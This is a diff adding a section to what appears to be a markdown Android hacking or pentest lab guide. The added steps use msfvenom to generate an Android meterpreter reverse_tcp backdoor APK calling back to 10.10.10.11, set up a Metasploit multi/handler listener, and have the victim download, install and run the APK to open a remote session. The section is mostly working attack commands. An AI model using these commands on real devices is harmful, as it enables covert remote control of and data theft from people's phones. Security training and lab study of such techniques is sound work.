@@ -48,13 +48,28 @@ cd Download
 sdcard/Download/secret.txt
 ```
 
+## Generating and Executing Payloads for Android
 
+#### Setup Android
 
+* Open terminal, run `su`
+* Run `ip addr add 10.10.10.69/24 dev eth0`
 
+#### Generate Payload&#x20;
 
+* `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.11 R > Desktop/Backdoor.apk` R raw
+* Host the payload and run a listener on Kali
+* Type `use exploit/multi/handler`
+* Type `set payload android/meterpreter/reverse_tcp`
+* Type `set LHOST 10.10.10.11`
+* Start listener, type `exploit -j -z`
+* Browse link of file to start meterpreter session.
 
+#### Exploit Execution
 
-
+* Open kali hosted link.
+* Download APK using es file downloader.
+* Install and run.
 
 ### **Exploit the Android Platform through ADB using PhoneSploit**
 
